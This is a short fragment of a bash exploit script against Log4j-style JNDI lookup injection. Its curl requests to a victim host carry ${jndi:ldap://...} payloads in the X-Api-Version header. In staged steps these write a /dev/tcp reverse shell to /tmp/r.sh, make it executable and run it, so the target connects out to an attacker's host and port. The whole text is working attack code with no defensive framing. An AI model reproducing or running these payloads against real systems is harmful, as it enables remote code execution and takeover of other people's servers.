...
# Create /tmp/r.sh with /dev/tcp revers shell
# 3 requests due to problems with parsing and payload size - yes i know - it's lame - 31336 :(

PAYLOAD=$( echo 'echo -en "bash -i >& /dev/tcp" > /tmp/r.sh' | base64)
curl $VICTIM -H "X-Api-Version: \${jndi:ldap://${EXPLOIT_SERVER}/Basic/Command/Base64/${PAYLOAD}}"

PAYLOAD=$( echo "echo -en \"/${REVERS_HOST}/${REVERS_PORT}\" >> /tmp/r.sh" | base64)
curl $VICTIM -H "X-Api-Version: \${jndi:ldap://${EXPLOIT_SERVER}/Basic/Command/Base64/${PAYLOAD}}"
...
# chmod +x /tmp/r.sh
PAYLOAD=$( echo 'chmod +x /tmp/r.sh' | base64)
curl $VICTIM -H "X-Api-Version: \${jndi:ldap://${EXPLOIT_SERVER}/Basic/Command/Base64/${PAYLOAD}}"

# run revers shell
PAYLOAD=$( echo 'bash /tmp/r.sh' | base64)
curl $VICTIM -H "X-Api-Version: \${jndi:ldap://${EXPLOIT_SERVER}/Basic/Command/Base64/${PAYLOAD}}"
